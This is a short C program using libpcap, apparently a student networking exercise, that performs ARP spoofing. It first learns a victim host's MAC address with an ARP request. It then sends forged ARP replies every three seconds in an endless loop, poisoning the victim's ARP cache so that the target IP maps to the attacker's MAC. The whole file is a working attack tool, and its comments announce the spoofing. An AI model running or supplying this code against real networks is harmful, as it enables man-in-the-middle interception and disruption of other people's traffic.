#include <send_arp.h>
#define SenderIP 0XC0A82BE1
#define IP_Number 0x0800
#define ARP_Number 0x0806

int main (int argc, const char * argv[])
{
//    int j = 0;
   if (argc != 4) {
     usage();
     return -1;
   }
    const char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   if (handle == NULL) {
     fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
     return -1;
   }

   ARP *ARP_Pac = (ARP*)malloc(sizeof(ARP));
   unsigned char * Attacker_mac = nullptr;

     // Get_Sender_Mac
    Attacker_mac = find_Attacker_Mac(dev);
    printf("TEST MY_MAC:");
 for(int i=0; i<6; i++)   printf("%02x",Attacker_mac[i]);
     memset(ARP_Pac->D_Mac,0xff,6);
     memcpy(ARP_Pac->S_Mac,Attacker_mac,6);
     ARP_Pac->Eth_type=htons(ARP_Number);
     ARP_Pac->HW_Type=htons(0x0001);
     ARP_Pac->PT_Type=htons(IP_Number);
     ARP_Pac->HAL=0X06;
     ARP_Pac->PAL=0x04;
     ARP_Pac->Oper_Code =htons(0x0001);// ARP Request
     for(int i=0; i<6; i++)ARP_Pac->SHW_Adr[i] =ARP_Pac->S_Mac[i];
       ARP_Pac->SPT_Adr= 0x00000000;
      //ARP_Pac->SPT_Adr=ntohl(0XC0A82B9D);  //attacker IP
     memset(ARP_Pac->DHW_Adr,0X00,6);
    // ARP_Pac->DPT_Adr= ntohl(0x0A010102);
     ARP_Pac->DPT_Adr=ntohl(SenderIP);


       while (true) { // if it receives packet, break;

           pcap_sendpacket(handle,(unsigned char *)ARP_Pac,42); //Send request
         struct pcap_pkthdr* header;
         const u_char* packet;



         int res = pcap_next_ex(handle, &header, &packet);

         if (res == 0) continue;
         if (res == -1 || res == -2)
           break;

         uint8_t OpCode= packet[21];
         printf("OpCode:%04x\n",OpCode);
         uint16_t eth_type=uint16_t((packet[12]<<8)|packet[13]);
         printf("eth_type:%02x\n",eth_type);
        uint32_t send_ip = (packet[28]<<24 )| (packet[29]<<16)| (packet[30] <<8)| packet[31];
          printf("send_ip:%02x\n",send_ip);
          printf("SPT_Adr:%02x\n",ARP_Pac->SPT_Adr);
        uint32_t target_ip = (packet[38]<<24 )| (packet[39]<<16)| (packet[40] <<8)| packet[41];
          printf("target_ip:%02x\n",target_ip);
           printf("DPT_Adr:%02x\n",ARP_Pac->DPT_Adr);


       if((0x0806==eth_type)&& (0x02== OpCode)&& (ARP_Pac->DPT_Adr ==ntohl(send_ip))&& (ARP_Pac->SPT_Adr==ntohl(target_ip)) )
         {
            for(int i=0; i<6; i++)
             {
                ARP_Pac->D_Mac[i] =packet[22+i];
                ARP_Pac->DHW_Adr[i]=packet[22+i];

             }
            printf("receive success!\n");
            //last reply setting
              ARP_Pac->SPT_Adr= inet_addr(argv[3]); //target IP 32bit string -> 32bit int
              ARP_Pac->DPT_Adr= inet_addr(argv[2]);// Sender IP
               ARP_Pac->Oper_Code =htons(0x0002);// ARP reply
            break;
         }

       }

while(1){
       pcap_sendpacket(handle,(unsigned char *)ARP_Pac,42); //arp_spoofing!!!
       printf("ARP Spoofing Success!\n");
       sleep(3);
}
    free(ARP_Pac);
   //  return 0;

}

